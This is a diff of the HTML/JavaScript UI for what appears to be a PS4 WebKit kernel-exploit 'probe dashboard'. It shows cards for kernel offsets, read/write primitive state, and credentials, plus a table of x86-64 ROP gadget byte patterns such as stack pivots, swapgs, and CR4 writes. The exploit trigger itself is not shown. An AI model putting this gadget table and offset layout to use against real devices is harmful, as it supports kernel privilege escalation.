@@ -3,20 +3,24 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>WebKit Exploit — Console</title>
+<title>WebKit Exploit — Kernel Probe Dashboard</title>
 <style>
   :root {
     --bg:        #0b0e13;
     --panel:     #12161f;
     --panel2:    #0f131a;
+    --panel3:    #0a0d14;
     --border:    #232a38;
+    --border2:   #1a1f2b;
     --text:      #c9d4e3;
     --dim:       #6b7a90;
+    --dim2:      #4a5566;
     --pass:      #3ddc84;
     --fail:      #ff5c5c;
     --warn:      #ffb020;
     --info:      #8fa6c4;
     --accent:    #4aa3ff;
+    --purple:    #b088ff;
   }
   * { box-sizing: border-box; }
   html, body { margin: 0; padding: 0; }
@@ -32,6 +36,7 @@
     overflow: hidden;
   }
 
+  /* ================= STATUS BAR ================= */
   #statusbar {
     display: flex;
     align-items: center;
@@ -43,6 +48,7 @@
     border-left: 6px solid var(--dim);
     border-radius: 6px;
     background: var(--panel);
+    flex: 0 0 auto;
   }
   #statusbar.pending  { border-left-color: var(--dim); }
   #statusbar.running  { border-left-color: var(--accent); }
@@ -54,7 +60,6 @@
   .dot {
     width: 12px; height: 12px; border-radius: 50%;
     background: var(--dim); flex: 0 0 auto;
-    box-shadow: 0 0 0 0 rgba(0,0,0,0);
   }
   #statusbar.running .dot { background: var(--accent); animation: pulse 1.1s infinite; }
   #statusbar.pass    .dot { background: var(--pass); box-shadow: 0 0 10px var(--pass); }
@@ -84,12 +89,14 @@
   .chip.fail { color: var(--fail); border-color: #4a1f1f; }
   .chip.warn { color: var(--warn); border-color: #4a3a1f; }
 
+  /* ================= TOOLBAR ================= */
   #toolbar {
     display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
     padding: 6px 8px;
     border: 1px solid var(--border);
     border-radius: 6px;
     background: var(--panel2);
+    flex: 0 0 auto;
   }
   button {
     font: inherit; font-size: 12px;
@@ -103,13 +110,148 @@
   button:hover { background: #253044; border-color: #35425c; }
   button:active { transform: translateY(1px); }
   button.primary { border-color: #1f4a7a; color: var(--accent); }
-  button.mjs { border-color: #4a2f7a; color: #b98fff; }
   #toolbar label { color: var(--dim); font-size: 11px; display: flex; align-items: center; gap: 4px; cursor: pointer; }
   #toolbar .spacer { flex: 1 1 auto; }
   #toolbar .meta { color: var(--dim); font-size: 11px; }
 
-  #consoleWrap {
+  /* ================= DASHBOARD ================= */
+  #dashboard {
     flex: 1 1 auto;
+    min-height: 0;
+    overflow: auto;
+    display: grid;
+    grid-template-columns: repeat(3, minmax(0, 1fr));
+    gap: 10px;
+    align-content: start;
+    padding-right: 2px;
+  }
+  @media (max-width: 900px) {
+    #dashboard { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+  }
+  @media (max-width: 620px) {
+    #dashboard { grid-template-columns: 1fr; }
+  }
+
+  .card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    transition: border-color .2s, box-shadow .2s;
+  }
+  .card.wide { grid-column: 1 / -1; }
+  .card.ok   { border-color: #1f4a35; box-shadow: 0 0 0 1px #1f4a3550 inset; }
+  .card.bad  { border-color: #4a1f1f; }
+  .card.warn { border-color: #4a3a1f; }
+
+  .card-header {
+    padding: 8px 12px;
+    background: var(--panel2);
+    border-bottom: 1px solid var(--border);
+    font-size: 11px;
+    letter-spacing: 1.2px;
+    color: var(--dim);
+    text-transform: uppercase;
+    font-weight: bold;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 8px;
+    flex: 0 0 auto;
+  }
+  .card-header .title { display: flex; align-items: center; gap: 8px; }
+  .card-header .icon { color: var(--accent); font-size: 13px; line-height: 1; }
+  .card.ok   .card-header .icon { color: var(--pass); }
+  .card.bad  .card-header .icon { color: var(--fail); }
+  .card.warn .card-header .icon { color: var(--warn); }
+
+  .badge {
+    padding: 2px 8px;
+    border-radius: 9px;
+    font-size: 10px;
+    font-weight: bold;
+    letter-spacing: .5px;
+    background: #1a1f2b;
+    color: var(--dim);
+    border: 1px solid var(--border2);
+  }
+  .badge.ok   { color: var(--pass); background: #0e1a14; border-color: #1f4a35; }
+  .badge.bad  { color: var(--fail); background: #1a0e0e; border-color: #4a1f1f; }
+  .badge.warn { color: var(--warn); background: #1a160a; border-color: #4a3a1f; }
+  .badge.run  { color: var(--accent); background: #0c1520; border-color: #1f4a7a; animation: pulse 1.1s infinite; }
+
+  .card-body {
+    padding: 4px 0 6px;
+    flex: 1 1 auto;
+  }
+
+  .row {
+    display: flex;
+    justify-content: space-between;
+    gap: 12px;
+    padding: 4px 12px;
+    font-size: 12px;
+    border-bottom: 1px solid #0a0d12;
+    align-items: baseline;
+  }
+  .row:last-child { border-bottom: none; }
+  .row .k { color: var(--dim); flex: 0 0 auto; white-space: nowrap; }
+  .row .v {
+    color: var(--text);
+    text-align: right;
+    word-break: break-all;
+    font-family: 'Courier New', monospace;
+    min-width: 0;
+  }
+  .row.ok   .v { color: var(--pass); }
+  .row.bad  .v { color: var(--fail); }
+  .row.warn .v { color: var(--warn); }
+  .row.dim  .v { color: var(--dim2); font-style: italic; }
+
+  /* ================= GADGET LIST ================= */
+  .gadget-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+    gap: 10px;
+    padding: 8px 10px;
+  }
+  .gadget-group {
+    background: var(--panel3);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    padding: 8px 10px;
+  }
+  .gadget-group-title {
+    font-size: 11px;
+    letter-spacing: 1px;
+    color: var(--purple);
+    text-transform: uppercase;
+    font-weight: bold;
+    margin-bottom: 6px;
+    display: flex;
+    justify-content: space-between;
+    gap: 6px;
+  }
+  .gadget-group-title .count { color: var(--dim); font-weight: normal; }
+  .gadget-list { display: flex; flex-direction: column; gap: 2px; }
+  .gadget {
+    display: flex;
+    justify-content: space-between;
+    gap: 8px;
+    padding: 2px 0;
+    font-size: 11.5px;
+    border-bottom: 1px dashed #141922;
+  }
+  .gadget:last-child { border-bottom: none; }
+  .gadget-name { color: var(--text); }
+  .gadget-addr { color: var(--accent); font-family: 'Courier New', monospace; }
+  .gadget.empty { color: var(--dim2); font-style: italic; font-size: 11px; }
+
+  /* ================= CONSOLE ================= */
+  #consolePanel {
+    flex: 0 0 200px;
     min-height: 0;
     border: 1px solid var(--border);
     border-radius: 6px;
@@ -117,16 +259,22 @@
     overflow: hidden;
     display: flex;
     flex-direction: column;
+    transition: flex-basis .15s;
   }
+  #consolePanel.collapsed { flex-basis: 30px; }
   #consoleHead {
-    padding: 5px 10px;
+    padding: 6px 10px;
     background: var(--panel);
     border-bottom: 1px solid var(--border);
     color: var(--dim);
     font-size: 11px;
     letter-spacing: 1px;
     display: flex; justify-content: space-between; gap: 8px;
+    cursor: pointer;
+    user-select: none;
+    flex: 0 0 auto;
   }
+  #consoleHead:hover { color: var(--text); }
   #out {
     flex: 1 1 auto;
     overflow: auto;
@@ -135,6 +283,7 @@
     line-height: 1.4;
     -webkit-overflow-scrolling: touch;
   }
+  #consolePanel.collapsed #out { display: none; }
   .logline {
     display: flex;
     gap: 8px;
@@ -151,18 +300,23 @@
   .logline.warn  { color: var(--warn);  border-left-color: var(--warn); background: #17120a; }
   .logline.debug { color: #5a6a80; border-left-color: #1c2433; }
 
-  #out::-webkit-scrollbar { width: 10px; height: 10px; }
-  #out::-webkit-scrollbar-track { background: #0a0d12; }
-  #out::-webkit-scrollbar-thumb { background: #263043; border-radius: 5px; }
+  #out::-webkit-scrollbar,
+  #dashboard::-webkit-scrollbar { width: 10px; height: 10px; }
+  #out::-webkit-scrollbar-track,
+  #dashboard::-webkit-scrollbar-track { background: #0a0d12; }
+  #out::-webkit-scrollbar-thumb,
+  #dashboard::-webkit-scrollbar-thumb { background: #263043; border-radius: 5px; }
 
   @media (max-width: 640px) {
     .logline { font-size: 11px; }
     #statusText { font-size: 13px; }
+    .card-header { font-size: 10px; }
   }
 </style>
 </head>
 <body>
 
+<!-- ================= STATUS BAR ================= -->
 <div id="statusbar" class="pending">
   <div class="status-left">
     <span class="dot"></span>
@@ -178,21 +332,23 @@
   </div>
 </div>
 
+<!-- ================= TOOLBAR ================= -->
 <div id="toolbar">
-  <button id="btnDownload" class="primary">⬇ Download log (.txt)</button>
-  <button id="btnSaveMjs" class="mjs">⬇ Save probe (.mjs)</button>
-  <button id="btnCopy">Copy log</button>
-  <button id="btnClear">Clear</button>
+  <button id="btnCopy" class="primary">Copy report</button>
+  <button id="btnClear">Clear log</button>
+  <button id="btnToggleConsole">Toggle console</button>
   <label><input type="checkbox" id="chkAutoScroll" checked> auto-scroll</label>
-  <label><input type="checkbox" id="chkAutoSave"> auto-save .txt</label>
-  <label><input type="checkbox" id="chkAutoMjs" checked> auto-save .mjs on probe</label>
   <span class="spacer"></span>
   <span class="meta" id="toolbarMeta">rev —</span>
 </div>
 
-<div id="consoleWrap">
-  <div id="consoleHead">
-    <span>CONSOLE OUTPUT</span>
+<!-- ================= DASHBOARD ================= -->
+<div id="dashboard"></div>
+
+<!-- ================= CONSOLE ================= -->
+<div id="consolePanel">
+  <div id="consoleHead" title="click to collapse/expand">
+    <span>▸ CONSOLE OUTPUT</span>
     <span id="consoleCount">0 lines</span>
   </div>
   <div id="out"></div>
@@ -202,7 +358,7 @@
 "use strict";
 
 /* ============================================================
- *  CONSOLE / LOGGER LAYER
+ *  LOGGER
  * ============================================================ */
 var LOG = {
     lines: [],
@@ -210,8 +366,6 @@ var LOG = {
     startTime: Date.now(),
     maxLines: 8000,
     autoScroll: true,
-    autoSave: false,
-    autoMjs: true,
     status: "pending",
     statusText: "INITIALIZING…",
     statusSub: "waiting for boot"
@@ -226,25 +380,21 @@ function fmtTime(ms) {
 
 function classify(tag, extra) {
     var t = (String(tag) + " " + (extra === undefined ? "" : String(extra))).toUpperCase();
-
     if (t.indexOf("FAILED")   !== -1) return "fail";
     if (t.indexOf("GIVE-UP")  !== -1) return "fail";
     if (t.indexOf("FAIL")     !== -1) return "fail";
     if (t.indexOf("MISMATCH") !== -1) return "fail";
     if (t.indexOf("THREW")    !== -1) return "fail";
     if (t.indexOf("ERROR")    !== -1) return "fail";
-
     if (t.indexOf("PASS")     !== -1) return "pass";
     if (t.indexOf("COMPLETE") !== -1) return "pass";
     if (t.indexOf("SUCCESS")  !== -1) return "pass";
     if (t.indexOf("RETAINED") !== -1) return "pass";
-
     if (t.indexOf("HALTED")   !== -1) return "warn";
     if (t.indexOf("MISS")     !== -1) return "warn";
     if (t.indexOf("RETRY")    !== -1) return "warn";
     if (t.indexOf("NO-RESULT")!== -1) return "warn";
     if (t.indexOf("NONE")     !== -1) return "warn";
-
     return "info";
 }
 
@@ -254,19 +404,15 @@ function renderLine(entry) {
         if (!el) return;
         var div = document.createElement("div");
         div.className = "logline " + entry.level;
-
         var t = document.createElement("span");
         t.className = "time";
         t.textContent = fmtTime(entry.t);
-
         var m = document.createElement("span");
         m.className = "msg";
         m.textContent = entry.text;
-
         div.appendChild(t);
         div.appendChild(m);
         el.appendChild(div);
-
         if (LOG.autoScroll) el.scrollTop = el.scrollHeight;
     } catch (_) {}
 }
@@ -305,41 +451,332 @@ function setStatus(state, text, sub) {
 function updateStatusFromMark(tag, extra) {
     var t = String(tag).toUpperCase();
     var e = extra === undefined ? "" : String(extra);
-
     if (t === "BOOT") {
         setStatus("running", "RUNNING", e);
-    } else if (t.indexOf("PS4 JAILBREAK START") !== -1) {
-        setStatus("running", "JAILBREAKING…", e);
     } else if (t.indexOf("KERNEL PROBE START") !== -1) {
         setStatus("running", "PROBING KERNEL…", e);
     } else if (t.indexOf("KERNEL PROBE COMPLETE") !== -1) {
-        setStatus("halted", "PROBE COMPLETE", "gadgets + kernel info in console");
-        maybeAutoSave();
+        setStatus("halted", "PROBE COMPLETE", "gadgets + kernel info on dashboard");
+    } else if (t.indexOf("PS4 JAILBREAK START") !== -1) {
+        setStatus("running", "JAILBREAKING…", e);
     } else if (t.indexOf("HALTED-BEFORE-JAILBREAK") !== -1) {
         setStatus("halted", "R/W PASS — HALTED", "jailbreak disabled (add ?jb=1 to continue)");
-        maybeAutoSave();
     } else if (t.indexOf("GENUINE-UB-RW-PASS") !== -1) {
         setStatus("pass", "ARBITRARY R/W — PASS", e);
     } else if (t.indexOf("JAILBREAK COMPLETE") !== -1) {
         setStatus("pass", "JAILBREAK COMPLETE — PASS", e);
-        maybeAutoSave();
     } else if (t.indexOf("FAILED-TERMINAL") === 0) {
         setStatus("fail", "FAILED — " + e, "terminal, no retry");
-        maybeAutoSave();
     } else if (t.indexOf("JAILBREAK-ERROR") === 0) {
         setStatus("fail", "JAILBREAK ERROR — FAIL", e);
-        maybeAutoSave();
     } else if (t.indexOf("PROBE-ERROR") === 0) {
         setStatus("fail", "PROBE ERROR — FAIL", e);
-        maybeAutoSave();
     }
 }
 
-function buildLogText() {
+/* ============================================================
+ *  DASHBOARD DEFINITION
+ * ============================================================ */
+var CARDS = [
+    { id: "fw", title: "Firmware", icon: "▣", rows: [
+        { key: "label",       label: "FW Label",      placeholder: "detecting…" },
+        { key: "ua",          label: "User Agent",    placeholder: "—" },
+        { key: "rev",         label: "Revision",      placeholder: "—" },
+        { key: "off-evf",     label: "EVF offset",    placeholder: "—" },
+        { key: "off-prison0", label: "prison0 offset",placeholder: "—" },
+        { key: "off-root",    label: "rootvnode off", placeholder: "—" },
+        { key: "off-sysent",  label: "sysent offset", placeholder: "—" },
+        { key: "off-jmp",     label: "jmp offset",    placeholder: "—" }
+    ]},
+    { id: "rw", title: "R/W Primitive", icon: "◈", rows: [
+        { key: "state",   label: "State",           placeholder: "waiting" },
+        { key: "read",    label: "Arbitrary read",  placeholder: "—" },
+        { key: "write",   label: "Arbitrary write", placeholder: "—" },
+        { key: "restore", label: "State restore",   placeholder: "—" },
+        { key: "host",    label: "Host address",    placeholder: "—" },
+        { key: "fake",    label: "Fake cell",       placeholder: "—" },
+        { key: "target",  label: "Target cell",     placeholder: "—" },
+        { key: "sid",     label: "SID",             placeholder: "—" },
+        { key: "rwhdr",   label: "RW header",       placeholder: "—" },
+        { key: "tghdr",   label: "Target header",   placeholder: "—" }
+    ]},
+    { id: "kbase", title: "Kernel Base", icon: "⌂", rows: [
+        { key: "base",  label: "KBASE",    placeholder: "0xffffffff80000000" },
+        { key: "q0",    label: "k[0x00]",  placeholder: "—" },
+        { key: "q1",    label: "k[0x08]",  placeholder: "—" },
+        { key: "q2",    label: "k[0x10]",  placeholder: "—" },
+        { key: "q3",    label: "k[0x18]",  placeholder: "—" }
+    ]},
+    { id: "evf", title: "EVF / proc0", icon: "◆", rows: [
+        { key: "addr",    label: "EVF address", placeholder: "—" },
+        { key: "proc0",   label: "proc0 ptr",   placeholder: "—" },
+        { key: "pid",     label: "p_pid",       placeholder: "—" },
+        { key: "ucred",   label: "p_ucred",     placeholder: "—" }
+    ]},
+    { id: "prison", title: "prison0", icon: "▤", rows: [
+        { key: "addr",  label: "Address", placeholder: "—" },
+        { key: "value", label: "Value",   placeholder: "—" }
+    ]},
+    { id: "root", title: "rootvnode", icon: "◉", rows: [
+        { key: "addr",  label: "Address", placeholder: "—" },
+        { key: "value", label: "Value",   placeholder: "—" }
+    ]},
+    { id: "sysent", title: "sysent[661]", icon: "⚙", rows: [
+        { key: "addr",   label: "Address",  placeholder: "—" },
+        { key: "narg",   label: "sy_narg",  placeholder: "—" },
+        { key: "call",   label: "sy_call",  placeholder: "—" },
+        { key: "thrcnt", label: "sy_thrcnt",placeholder: "—" },
+        { key: "jmp",    label: "jmp gadget", placeholder: "—" }
+    ]},
+    { id: "ucred", title: "Credential Chain", icon: "◆", rows: [
+        { key: "addr",   label: "ucred addr", placeholder: "—" },
+        { key: "uid",    label: "uid",        placeholder: "—" },
+        { key: "gid",    label: "gid",        placeholder: "—" },
+        { key: "prison", label: "cr_prison",  placeholder: "—" },
+        { key: "ngroups",label: "ngroups",    placeholder: "—" }
+    ]},
+    { id: "gadgets", title: "Gadgets & ROP", icon: "⟐", wide: true, gadgets: true }
+];
+
+/* ============================================================
+ *  DASHBOARD BUILD + UPDATE HELPERS
+ * ============================================================ */
+function buildDashboard() {
+    var grid = document.getElementById("dashboard");
+    grid.innerHTML = "";
+    CARDS.forEach(function(card) {
+        var el = document.createElement("section");
+        el.className = "card" + (card.wide ? " wide" : "");
+        el.id = "card-" + card.id;
+
+        var hdr = document.createElement("div");
+        hdr.className = "card-header";
+        var title = document.createElement("span");
+        title.className = "title";
+        title.innerHTML = '<span class="icon">' + (card.icon || "▪") + '</span>' + card.title;
+        var badge = document.createElement("span");
+        badge.className = "badge";
+        badge.id = "badge-" + card.id;
+        badge.textContent = "WAIT";
+        hdr.appendChild(title);
+        hdr.appendChild(badge);
+        el.appendChild(hdr);
+
+        var body = document.createElement("div");
+        body.className = "card-body";
+        body.id = "body-" + card.id;
+        el.appendChild(body);
+
+        if (card.gadgets) {
+            body.innerHTML = '<div class="gadget-grid" id="gadget-grid">' +
+                '<div class="gadget-group"><div class="gadget-group-title">Waiting for R/W</div>' +
+                '<div class="gadget-list"><div class="gadget empty">probe has not run yet</div></div></div></div>';
+        } else {
+            card.rows.forEach(function(row) {
+                var r = document.createElement("div");
+                r.className = "row";
+                r.id = "row-" + card.id + "-" + row.key;
+                var k = document.createElement("span");
+                k.className = "k";
+                k.textContent = row.label;
+                var v = document.createElement("span");
+                v.className = "v";
+                v.textContent = row.placeholder || "—";
+                r.appendChild(k);
+                r.appendChild(v);
+                body.appendChild(r);
+            });
+        }
+        grid.appendChild(el);
+    });
+}
+
+function setRow(cardId, rowKey, value, level) {
+    var el = document.getElementById("row-" + cardId + "-" + rowKey);
+    if (!el) return;
+    el.className = "row" + (level ? " " + level : "");
+    var v = el.querySelector(".v");
+    if (v) v.textContent = (value === undefined || value === null || value === "") ? "—" : String(value);
+}
+
+function setBadge(cardId, text, level) {
+    var el = document.getElementById("badge-" + cardId);
+    if (!el) return;
+    el.className = "badge" + (level ? " " + level : "");
+    el.textContent = text;
+}
+
+function setCardState(cardId, level) {
+    var el = document.getElementById("card-" + cardId);
+    if (!el) return;
+    el.className = el.className.replace(/\s+(ok|bad|warn)\b/g, "");
+    if (level) el.className += " " + level;
+}
+
+/* ============================================================
+ *  GADGET PATTERN TABLE
+ * ============================================================ */
+var GADGET_CATS = {
+    pop:     "Pop Registers",
+    stack:   "Stack Pivots",
+    priv:    "Privilege / Transition",
+    cr:      "Control Registers",
+    mov:     "Register Moves",
+    jmpcall: "Indirect Jumps & Calls",
+    misc:    "Misc"
+};
+var GADGET_CAT_ORDER = ["pop", "stack", "priv", "cr", "mov", "jmpcall", "misc"];
+
+var GADGETS = [
+    { cat: "pop", name: "pop rdi ; ret",              bytes: [0x5F, 0xC3] },
+    { cat: "pop", name: "pop rsi ; ret",              bytes: [0x5E, 0xC3] },
+    { cat: "pop", name: "pop rdx ; ret",              bytes: [0x5A, 0xC3] },
+    { cat: "pop", name: "pop rcx ; ret",              bytes: [0x59, 0xC3] },
+    { cat: "pop", name: "pop rax ; ret",              bytes: [0x58, 0xC3] },
+    { cat: "pop", name: "pop rbx ; ret",              bytes: [0x5B, 0xC3] },
+    { cat: "pop", name: "pop rsp ; ret",              bytes: [0x5C, 0xC3] },
+    { cat: "pop", name: "pop rbp ; ret",              bytes: [0x5D, 0xC3] },
+    { cat: "pop", name: "pop r8  ; ret",              bytes: [0x41, 0x58, 0xC3] },
+    { cat: "pop", name: "pop r9  ; ret",              bytes: [0x41, 0x59, 0xC3] },
+    { cat: "pop", name: "pop r10 ; ret",              bytes: [0x41, 0x5A, 0xC3] },
+    { cat: "pop", name: "pop r11 ; ret",              bytes: [0x41, 0x5B, 0xC3] },
+    { cat: "pop", name: "pop r12 ; ret",              bytes: [0x41, 0x5C, 0xC3] },
+    { cat: "pop", name: "pop r13 ; ret",              bytes: [0x41, 0x5D, 0xC3] },
+    { cat: "pop", name: "pop r14 ; ret",              bytes: [0x41, 0x5E, 0xC3] },
+    { cat: "pop", name: "pop r15 ; ret",              bytes: [0x41, 0x5F, 0xC3] },
+
+    { cat: "stack", name: "leave ; ret",              bytes: [0xC9, 0xC3] },
+    { cat: "stack", name: "pop rsp ; pop rbp ; ret",  bytes: [0x5C, 0x5D, 0xC3] },
+    { cat: "stack", name: "add rsp, 0x28 ; ret",      bytes: [0x48, 0x83, 0xC4, 0x28, 0xC3] },
+    { cat: "stack", name: "add rsp, 0x38 ; ret",      bytes: [0x48, 0x83, 0xC4, 0x38, 0xC3] },
+    { cat: "stack", name: "sub rsp, 0x28 ; ret",      bytes: [0x48, 0x83, 0xEC, 0x28, 0xC3] },
+    { cat: "stack", name: "xchg rax, rsp ; ret",      bytes: [0x48, 0x94, 0xC3] },
+
+    { cat: "priv", name: "swapgs ; ret",              bytes: [0x0F, 0x01, 0xF8, 0xC3] },
+    { cat: "priv", name: "swapgs ; iretq",            bytes: [0x0F, 0x01, 0xF8, 0x48, 0xCF] },
+    { cat: "priv", name: "iretq",                     bytes: [0x48, 0xCF] },
+    { cat: "priv", name: "sysretq",                   bytes: [0x48, 0x0F, 0x07] },
+    { cat: "priv", name: "sysret",                    bytes: [0x0F, 0x07] },
+
+    { cat: "cr", name: "mov cr4, rdi ; ret",          bytes: [0x0F, 0x22, 0xE7, 0xC3] },
+    { cat: "cr", name: "mov cr4, rax",                bytes: [0x0F, 0x22, 0xE0] },
+    { cat: "cr", name: "mov cr0, rdi",                bytes: [0x0F, 0x22, 0xC7] },
+    { cat: "cr", name: "mov cr3, rdi",                bytes: [0x0F, 0x22, 0xDF] },
+
+    { cat: "mov", name: "mov rdi, rax ; ...",         bytes: [0x48, 0x89, 0xC7] },
+    { cat: "mov", name: "mov rdi, rsp ; ...",         bytes: [0x48, 0x89, 0xE7] },
+    { cat: "mov", name: "xchg edi, eax",              bytes: [0x97] },
+
+    { cat: "jmpcall", name: "jmp rax",                bytes: [0xFF, 0xE0] },
+    { cat: "jmpcall", name: "jmp rcx",                bytes: [0xFF, 0xE1] },
+    { cat: "jmpcall", name: "jmp rdx",                bytes: [0xFF, 0xE2] },
+    { cat: "jmpcall", name: "jmp rsi",                bytes: [0xFF, 0xE6] },
+    { cat: "jmpcall", name: "jmp rdi",                bytes: [0xFF, 0xE7] },
+    { cat: "jmpcall", name: "call rax",               bytes: [0xFF, 0xD0] },
+    { cat: "jmpcall", name: "call rsi",               bytes: [0xFF, 0xD6] },
+    { cat: "jmpcall", name: "call rdi",               bytes: [0xFF, 0xD7] },
+
+    { cat: "misc", name: "ret",                       bytes: [0xC3] },
+    { cat: "misc", name: "nop ; ret",                 bytes: [0x90, 0xC3] },
+    { cat: "misc", name: "cli ; ret",                 bytes: [0xFA, 0xC3] },
+    { cat: "misc", name: "sti ; ret",                 bytes: [0xFB, 0xC3] },
+    { cat: "misc", name: "wrmsr",                     bytes: [0x0F, 0x30] },
+    { cat: "misc", name: "rdmsr",                     bytes: [0x0F, 0x32] },
+    { cat: "misc", name: "pushfq ; pop rax",          bytes: [0x9C, 0x58] },
+    { cat: "misc", name: "popfq",                     bytes: [0x9D] },
+    { cat: "misc", name: "syscall",                   bytes: [0x0F, 0x05] },
+    { cat: "misc", name: "sysenter",                  bytes: [0x0F, 0x34] },
+    { cat: "misc", name: "int 0x80",                  bytes: [0xCD, 0x80] },
+    { cat: "misc", name: "int3 ; ret",                bytes: [0xCC, 0xC3] }
+];
+
+var GADGET_HITS = {};
+GADGET_CAT_ORDER.forEach(function(c) { GADGET_HITS[c] = []; });
+
+function addGadgetHit(cat, name, addr) {
+    var list = GADGET_HITS[cat] || (GADGET_HITS[cat] = []);
+    for (var i = 0; i < list.length; i++) if (list[i].name === name) return;
+    list.push({ name: name, addr: addr });
+}
+
+function renderGadgets() {
+    var grid = document.getElementById("gadget-grid");
+    if (!grid) return;
+    var total = 0;
+    GADGET_CAT_ORDER.forEach(function(c) { total += (GADGET_HITS[c] || []).length; });
+
+    grid.innerHTML = "";
+    GADGET_CAT_ORDER.forEach(function(cat) {
+        var list = GADGET_HITS[cat] || [];
+        var group = document.createElement("div");
+        group.className = "gadget-group";
+
+        var title = document.createElement("div");
+        title.className = "gadget-group-title";
+        title.innerHTML = '<span>' + GADGET_CATS[cat] + '</span>' +
+                          '<span class="count">' + list.length + ' hit' + (list.length === 1 ? '' : 's') + '</span>';
+        group.appendChild(title);
+
+        var ul = document.createElement("div");
+        ul.className = "gadget-list";
+        if (list.length === 0) {
+            var empty = document.createElement("div");
+            empty.className = "gadget empty";
+            empty.textContent = "no hits";
+            ul.appendChild(empty);
+        } else {
+            list.forEach(function(g) {
+                var row = document.createElement("div");
+                row.className = "gadget";
+                var n = document.createElement("span");
+                n.className = "gadget-name";
+                n.textContent = g.name;
+                var a = document.createElement("span");
+                a.className = "gadget-addr";
+                a.textContent = g.addr;
+                row.appendChild(n);
+                row.appendChild(a);
+                ul.appendChild(row);
+            });
+        }
+        group.appendChild(ul);
+        grid.appendChild(group);
+    });
+
+    if (total > 0) {
+        setBadge("gadgets", total + " HITS", "ok");
+        setCardState("gadgets", "ok");
+    } else {
+        setBadge("gadgets", "NO HITS", "warn");
+        setCardState("gadgets", "warn");
+    }
+}
+
+/* ============================================================
+ *  REPORT TEXT (used by Copy report)
+ * ============================================================ */
+var headerMsg = "mansoor0x + OptiTronOffical [probe dashboard]";
+var headerBorder = "=".repeat(50);
+var headerPrinted = false;
+
+function printHeader() {
+    if (headerPrinted) return;
+    headerPrinted = true;
+    logLine(headerBorder, "info");
+    logLine(" " + headerMsg, "info");
+    logLine(" Credits:", "info");
+    logLine("   mansoor0x       - base HTML script", "info");
+    logLine("   primehat06-wq   - uploaded to GitHub / found repo", "info");
+    logLine("   OptiTronOffical - vibe coding, testing, repo dorking", "info");
+    logLine(" Mode: post-R/W kernel probe dashboard", "info");
+    logLine(headerBorder, "info");
+}
+
+function buildReportText() {
     var L = [];
     var line = "==================================================";
     L.push(line);
-    L.push(" WebKit Exploit Log — " + headerMsg);
+    L.push(" WebKit Exploit — Kernel Probe Report");
     L.push(line);
     L.push("Revision     : " + (typeof REVISION !== "undefined" ? REVISION : "?"));
     L.push("Firmware     : " + (typeof FW_LABEL !== "undefined" && FW_LABEL ? FW_LABEL : "(undetected)"));
@@ -352,64 +789,44 @@ function buildLogText() {
                        "  FAIL=" + LOG.counts.fail +
                        "  WARN=" + LOG.counts.warn +
                        "  INFO=" + LOG.counts.info);
-    L.push("Credits      :");
-    L.push("  mansoor0x       - base HTML script");
-    L.push("  primehat06-wq   - uploaded to GitHub / found repo");
-    L.push("  OptiTronOffical - vibe coding, testing, repo dorking");
-    L.push("--------------------------------------------------");
+    L.push(line);
+    L.push(" -- DASHBOARD SNAPSHOT --");
+    CARDS.forEach(function(card) {
+        L.push("");
+        L.push("[" + card.title + "]");
+        if (card.gadgets) {
+            GADGET_CAT_ORDER.forEach(function(cat) {
+                var list = GADGET_HITS[cat] || [];
+                L.push("  " + GADGET_CATS[cat] + " (" + list.length + "):");
+                if (list.length === 0) L.push("    (no hits)");
+                else list.forEach(function(g) { L.push("    " + g.name + " @ " + g.addr); });
+            });
+        } else {
+            card.rows.forEach(function(row) {
+                var el = document.getElementById("row-" + card.id + "-" + row.key);
+                var v = el ? el.querySelector(".v").textContent : "—";
+                L.push("  " + pad(row.label, 20) + " : " + v);
+            });
+        }
+    });
+    L.push("");
+    L.push(line);
+    L.push(" -- FULL LOG --");
     for (var i = 0; i < LOG.lines.length; i++) {
         var e = LOG.lines[i];
         L.push("[" + fmtTime(e.t) + "] [" + pad(e.level.toUpperCase(), 4) + "] " + e.text);
     }
     L.push("--------------------------------------------------");
-    L.push("END OF LOG (" + LOG.lines.length + " entries)");
+    L.push("END OF REPORT (" + LOG.lines.length + " log entries)");
     return L.join("\r\n");
 }
 
-function downloadText(filename, text, mime) {
-    try {
-        var blob = new Blob([text], { type: mime || "text/plain;charset=utf-8" });
-        var url = URL.createObjectURL(blob);
-        var a = document.createElement("a");
-        a.href = url;
-        a.download = filename;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        setTimeout(function () { try { URL.revokeObjectURL(url); } catch (_) {} }, 10000);
-        return true;
-    } catch (err) {
-        logLine("SAVE-FAILED " + filename + " " + err, "warn");
-        return false;
-    }
-}
-
-function downloadLog() {
-    try {
-        var text = buildLogText();
-        var stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
-        if (downloadText("ps4-probe-log-" + stamp + ".txt", text)) {
-            logLine("LOG-SAVED file=ps4-probe-log-" + stamp + ".txt bytes=" + text.length, "info");
-        }
-    } catch (err) {
-        logLine("LOG-SAVE-FAILED " + err, "warn");
-    }
-}
-
-var autoSaveDone = false;
-function maybeAutoSave() {
-    if (autoSaveDone) return;
-    if (!LOG.autoSave) return;
-    autoSaveDone = true;
-    setTimeout(downloadLog, 400);
-}
-
-function copyLog() {
-    var text = buildLogText();
+function copyReport() {
+    var text = buildReportText();
     try {
         if (navigator.clipboard && navigator.clipboard.writeText) {
             navigator.clipboard.writeText(text).then(
-                function () { logLine("LOG-COPIED chars=" + text.length, "info"); },
+                function () { logLine("REPORT-COPIED chars=" + text.length, "info"); },
                 function () { fallbackCopy(text); }
             );
         } else {
@@ -428,9 +845,9 @@ function fallbackCopy(text) {
         ta.select();
         document.execCommand("copy");
         document.body.removeChild(ta);
-        logLine("LOG-COPIED (fallback) chars=" + text.length, "info");
+        logLine("REPORT-COPIED (fallback) chars=" + text.length, "info");
     } catch (err) {
-        logLine("LOG-COPY-FAILED " + err, "warn");
+        logLine("REPORT-COPY-FAILED " + err, "warn");
     }
 }
 
@@ -441,29 +858,26 @@ function clearLog() {
     updateChips();
 }
 
